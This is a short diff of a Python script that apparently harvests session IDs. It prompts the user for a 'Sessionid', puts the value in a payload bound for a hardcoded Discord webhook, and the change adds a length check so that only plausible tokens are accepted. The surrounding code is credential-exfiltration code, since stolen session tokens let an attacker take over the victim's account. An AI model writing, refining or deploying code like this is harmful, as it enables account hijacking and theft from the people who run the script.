@@ -32,6 +32,11 @@ webhook_url = "https://discord.com/api/webhooks/1106961532119687218/zgVPlD2WcaSy
 
 while True:
     message = input("Sessionid: ")
+    if not 27 <= len(message) <= 38:
+       print(" ")
+       print("Invalid Sessionid !!!")
+       time.sleep(2)
+       break
     clear_console()
     payload = {
         "content": f"Sessionid: {message}"
